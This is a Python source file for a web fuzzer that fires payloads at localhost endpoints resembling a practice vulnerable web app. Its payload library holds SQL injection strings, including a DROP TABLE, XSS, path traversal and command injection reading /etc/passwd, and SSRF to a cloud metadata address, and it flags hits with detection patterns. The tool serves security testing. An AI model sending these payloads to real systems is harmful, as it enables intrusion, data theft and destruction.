import re
import time
import json
import random
import requests
from datetime import datetime
from typing import Dict, List

# Fix: Replace the broken _send_fuzz_request with a proper class-based approach

class Response:
    def __init__(self, status_code, text, elapsed):
        self.status_code = status_code
        self.text = text
        self.elapsed = elapsed

class Elapsed:
    def __init__(self, seconds):
        self._seconds = seconds
    def total_seconds(self):
        return self._seconds

class NovaFuzzer:
    def __init__(self, base_url="http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({"User-Agent": "Nova/3.0 (Fuzzer)"})
        self.results = []
        self.anomaly_patterns = {
            "sql_error": [r"SQL syntax", r"mysql_fetch", r"ORA-\d+", r"PostgreSQL", r"sqlite", r"SQLITE_", r"unclosed quotation", r'near "', r"UNION.*SELECT", r"column.*not found"],
            "stack_trace": [r"Traceback", r"stack trace", r"at \w+\.\w+:\d+", r'Error:.*\n.*at ', r'File ".*", line \d+'],
            "debug_info": [r"debug", r"dump", r"var_dump", r"print_r", r"console\.log", r"DEBUG:", r"\[object Object\]"],
            "path_disclosure": [r"/var/www", r"/home/", r"C:\\", r"/opt/", r"\/data\/", r"\/usr\/", r"internal path"],
            "xss_reflection": [r"<script>.*</script>", r"onerror=", r"onload=", r"javascript:", r"<img.*src=x", r"<svg.*onload"],
            "open_redirect": [r"Location:.*https?://", r"redirect.*https?://", r"url=.*https?://", r"next=.*https?://"],
            "server_error": [r"500.*Internal", r"503.*Service", r"502.*Bad Gateway", r"unhandled.*error"],
            "auth_bypass_indicator": [r"admin.*panel", r"dashboard", r"role.*admin", r"isAdmin.*true", r"privilege.*elevated"],
        }
        self.payload_library = {
            "sql_injection": ["'", '"', "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", "'; DROP TABLE users--", "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "1' AND '1'='1", "1' AND '1'='2", "admin'--", "' OR 1=1 LIMIT 1--"],
            "xss": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", '"><script>alert(1)</script>', "'><script>alert(1)</script>", "><img src=x onerror=alert(1)>"],
            "path_traversal": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "/etc/passwd"],
            "command_injection": ["; ls", "| ls", "`ls`", "$(ls)", "; id", "; cat /etc/passwd"],
            "ssrf": ["http://localhost:3000/admin", "http://127.0.0.1:3000/api", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"],
            "null_byte": ["%00", "\x00", "%2500", "test.php%00.jpg"],
            "type_juggling": ["true", "false", "null", "0", "1", "[]", "{}", "0e12345"],
        }

    def detect_anomalies(self, response) -> Dict:
        detected = {
            "status_code": response.status_code,
            "response_length": len(response.text),
            "response_time": response.elapsed.total_seconds(),
            "anomalies": [],
            "severity": "none",
        }
        for category, patterns in self.anomaly_patterns.items():
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    detected["anomalies"].append({"category": category, "pattern": pattern})
                    break
        anomaly_categories = [a["category"] for a in detected["anomalies"]]
        if "sql_error" in anomaly_categories or "command_injection" in anomaly_categories:
            detected["severity"] = "critical"
        elif "stack_trace" in anomaly_categories or "path_disclosure" in anomaly_categories:
            detected["severity"] = "high"
        elif "xss_reflection" in anomaly_categories or "open_redirect" in anomaly_categories:
            detected["severity"] = "medium"
        elif anomaly_categories:
            detected["severity"] = "low"
        return detected

    def _send_fuzz_request(self, endpoint, method, params, payload):
        url = f"{self.base_url}{endpoint}"
        param_dict = {p: payload for p in params}
        try:
            start = time.time()
            if method.upper() == "GET":
                resp = self.session.get(url, params=param_dict, timeout=10)
            elif method.upper() == "POST":
                resp = self.session.post(url, data=param_dict, timeout=10)
            else:
                resp = self.session.request(method, url, data=param_dict, timeout=10)
            elapsed_seconds = time.time() - start
            return {
                "endpoint": endpoint, "method": method, "payload": payload,
                "timestamp": datetime.now().isoformat(),
                "response": Response(resp.status_code, resp.text, Elapsed(elapsed_seconds)),
            }
        except Exception as e:
            return {
                "endpoint": endpoint, "method": method, "payload": payload,
                "timestamp": datetime.now().isoformat(),
                "response": Response(0, str(e), Elapsed(0)),
            }

    def fuzz_endpoint(self, endpoint, method="GET", params=None, fuzz_types=None, intensity="medium"):
        if params is None: params = ["q"]
        if fuzz_types is None: fuzz_types = ["sql_injection", "xss", "path_traversal"]
        results = []
        intensity_map = {"low": 3, "medium": 8, "high": 15, "extreme": "all"}
        count = intensity_map.get(intensity, 8)
        print(f"\n  🎲 Fuzzing: {method} {endpoint}")
        for fuzz_type in fuzz_types:
            payloads = self.payload_library.get(fuzz_type, [])
            if count != "all":
                payloads = random.sample(payloads, min(count, len(payloads)))
            for base_payload in payloads:
                result = self._send_fuzz_request(endpoint, method, params, base_payload)
                anomaly = self.detect_anomalies(result["response"])
                result.update(anomaly)
                results.append(result)
                if anomaly["anomalies"]:
                    cats = ', '.join(a['category'] for a in anomaly['anomalies'])
                    print(f"     🔴 [{anomaly['severity'].upper()}] {base_payload[:40]} → {cats}")
                time.sleep(0.05)
        print(f"     ✅ {len([r for r in results if r['anomalies']])} anomalies found")
        return results

    def fuzz_targets(self, targets, intensity="medium"):
        print("""
╔══════════════════════════════════════╗
║   NOVA INTELLIGENT FUZZER v1.1     ║
║   Mutation-Based Attack Surface    ║
╚══════════════════════════════════════╝""")
        all_results = []
        for target in targets:
            results = self.fuzz_endpoint(
                endpoint=target["endpoint"],
                method=target.get("method", "GET"),
                params=target.get("params", ["q"]),
                fuzz_types=target.get("fuzz_types", ["sql_injection", "xss"]),
                intensity=target.get("intensity", intensity),
            )
            all_results.extend(results)
        critical = [r for r in all_results if r.get("severity") == "critical"]
        high = [r for r in all_results if r.get("severity") == "high"]
        medium = [r for r in all_results if r.get("severity") == "medium"]
        report = {
            "timestamp": datetime.now().isoformat(),
            "total_payloads": len(all_results),
            "anomalies_found": len([r for r in all_results if r["anomalies"]]),
            "critical": len(critical), "high": len(high), "medium": len(medium),
            "top_findings": (critical + high + medium)[:10],
        }
        with open("nova_fuzzer_report.json", "w") as f:
            json.dump(report, f, indent=2, default=str)
        print(f"""
╔══════════════════════════════════════╗
║        FUZZING COMPLETE             ║
╠══════════════════════════════════════╣
║  Payloads Sent:    {report['total_payloads']:>4}             ║
║  Anomalies Found:  {report['anomalies_found']:>4}             ║
║  Critical:         {report['critical']:>4}             ║
║  High:             {report['high']:>4}             ║
║  Medium:           {report['medium']:>4}             ║
╚══════════════════════════════════════╝""")
        return report


if __name__ == "__main__":
    fuzzer = NovaFuzzer()
    targets = [
        {"endpoint": "/rest/products/search", "method": "GET", "params": ["q"], "fuzz_types": ["sql_injection", "xss", "path_traversal"]},
        {"endpoint": "/rest/user/login", "method": "POST", "params": ["email", "password"], "fuzz_types": ["sql_injection", "type_juggling"]},
        {"endpoint": "/api/Feedbacks", "method": "POST", "params": ["comment", "rating"], "fuzz_types": ["xss", "sql_injection", "command_injection"]},
        {"endpoint": "/file-serving", "method": "GET", "params": ["file"], "fuzz_types": ["path_traversal", "null_byte", "ssrf"]},
    ]
    report = fuzzer.fuzz_targets(targets, intensity="medium")
